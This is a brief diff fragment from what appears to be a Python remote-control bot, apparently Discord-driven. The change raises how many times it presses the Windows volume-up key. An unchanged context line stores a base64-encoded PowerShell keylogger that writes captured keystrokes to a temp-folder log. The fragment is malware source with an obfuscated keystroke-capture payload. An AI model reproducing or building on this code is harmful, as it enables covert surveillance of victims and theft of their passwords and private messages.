@@ -75,7 +75,7 @@ keyrec = "ZnVuY3Rpb24gVGVzdC1LZXlMb2dnZXIoJGxvZ1BhdGg9IiRlbnY6dGVtcFx0ZXN0X2tleW
 def volumeup():
     import win32api
     import win32con
-    for i in range(80):
+    for i in range(140):
         win32api.keybd_event(win32con.VK_VOLUME_UP, 0)
 
 @client.event
